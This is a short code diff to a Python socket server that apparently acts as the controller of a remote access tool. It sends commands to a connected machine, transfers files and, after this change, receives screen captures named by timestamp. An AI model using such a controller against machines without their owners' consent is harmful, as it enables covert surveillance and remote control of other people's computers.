@@ -6,6 +6,7 @@
 import os
 import socket
 import hashlib
+from datetime import datetime as dt
 
 ip = "0.0.0.0"
 port = 8080
@@ -116,9 +117,11 @@ def connect():
             source = input("Source path: ")
             mySocket.send(command.encode())
             doSend(mySocket, source, destination, fileName)
-        elif 'screencap' in commandList[0]:
-            transfer(mySocket, command, "screenCap")
-
+        elif 'screencap' == commandList[0]:
+            mySocket.send(command.encode())
+            # just using path here for the name
+            path = os.path.join('/NONEXISTANT-SCREENCAP', dt.now().isoformat())
+            receiveFile(mySocket, path)
         else:
             mySocket.send(command.encode())
             print(mySocket.recv(chunksize).decode())
